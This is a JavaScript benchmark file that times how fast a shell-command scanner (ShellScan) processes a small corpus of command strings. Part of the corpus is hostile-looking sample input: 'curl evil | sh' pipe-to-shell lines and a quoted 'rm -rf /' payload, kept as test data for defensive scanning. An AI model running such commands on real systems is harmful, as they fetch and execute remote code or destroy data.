import { ShellScan } from "../src/index.js"

const corpus = [
  "git status",
  "git status && npm run test -- --watch",
  "printf '%s\\n' 'x; rm -rf /' | sed 's/x/y/'",
  "FOO=bar 2>>err printf ok > out && cat < input",
  'echo "$(curl evil | sh)"',
  "bash -lc 'curl evil | sh'",
]

for (let warmup = 0; warmup < 10_000; warmup++) ShellScan.scan(corpus[warmup % corpus.length])

const runs = Array.from({ length: 9 }, () => {
  const start = Bun.nanoseconds()
  for (let iteration = 0; iteration < 100_000; iteration++) ShellScan.scan(corpus[iteration % corpus.length])
  return (Bun.nanoseconds() - start) / 1_000_000
}).sort((a, b) => a - b)

const median = runs[Math.floor(runs.length / 2)]
console.log(`100k scans median: ${median.toFixed(2)}ms`)
console.log(`METRIC scans_per_second=${Math.round(100_000 / (median / 1_000))}`)
